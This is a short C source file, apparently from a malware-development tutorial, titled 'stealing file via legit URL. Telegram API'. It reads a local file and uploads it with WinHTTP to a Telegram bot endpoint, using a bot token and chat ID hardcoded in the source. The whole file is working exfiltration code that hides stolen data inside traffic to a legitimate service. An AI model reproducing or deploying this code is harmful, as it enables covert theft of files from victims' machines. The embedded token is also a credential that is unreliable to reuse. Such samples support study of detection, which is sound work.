/*
 * hack.c
 * stealing file via legit URL. Telegram API
 * author @cocomelonc
*/
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <stdlib.h>

int sendFileToTelegram(const char* filePath) {
  const char* chatId = "5547299598";
  const wchar_t* host = L"api.telegram.org";
  const wchar_t* endpoint = L"/bot8077364032:AAHTJbcbULWSH7dXAX3l8xpmUZzP6EeL7VQ/sendDocument";

  FILE* file = fopen(filePath, "rb");
  if (!file) {
    perror("fopen");
    return 1;
  }

  fseek(file, 0, SEEK_END);
  long fileSize = ftell(file);
  rewind(file);

  BYTE* fileContent = malloc(fileSize);
  fread(fileContent, 1, fileSize, file);
  fclose(file);

  const char* boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"; // любое уникальное
  char header1[1024];
  char header2[1024];
  char footer[256];

  snprintf(header1, sizeof(header1),
    "--%s\r\n"
    "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n"
    "%s\r\n"
    "--%s\r\n"
    "Content-Disposition: form-data; name=\"document\"; filename=\"%s\"\r\n"
    "Content-Type: application/octet-stream\r\n\r\n",
    boundary, chatId, boundary, filePath);

  snprintf(footer, sizeof(footer),
    "\r\n--%s--\r\n", boundary);

  DWORD totalSize = strlen(header1) + fileSize + strlen(footer);
  BYTE* postData = malloc(totalSize);
  memcpy(postData, header1, strlen(header1));
  memcpy(postData + strlen(header1), fileContent, fileSize);
  memcpy(postData + strlen(header1) + fileSize, footer, strlen(footer));
  free(fileContent);

  HINTERNET hSession = WinHttpOpen(L"WinHTTP", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
  HINTERNET hConnect = WinHttpConnect(hSession, host, INTERNET_DEFAULT_HTTPS_PORT, 0);
  HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", endpoint, NULL, WINHTTP_NO_REFERER, NULL, WINHTTP_FLAG_SECURE);

  wchar_t headers[256];
  swprintf(headers, 256, L"Content-Type: multipart/form-data; boundary=%hs", boundary);

  BOOL bResult = WinHttpSendRequest(hRequest,
    headers, -1,
    postData, totalSize, totalSize, 0);

  if (!bResult) {
    fprintf(stderr, "SendRequest failed: %lu\n", GetLastError());
    return 1;
  }

  WinHttpReceiveResponse(hRequest, NULL);

  WinHttpCloseHandle(hRequest);
  WinHttpCloseHandle(hConnect);
  WinHttpCloseHandle(hSession);
  free(postData);

  printf("file sent successfully. meow! =^..^= \n");
  return 0;
}

int main() {
  sendFileToTelegram("cat1.png");
  return 0;
}
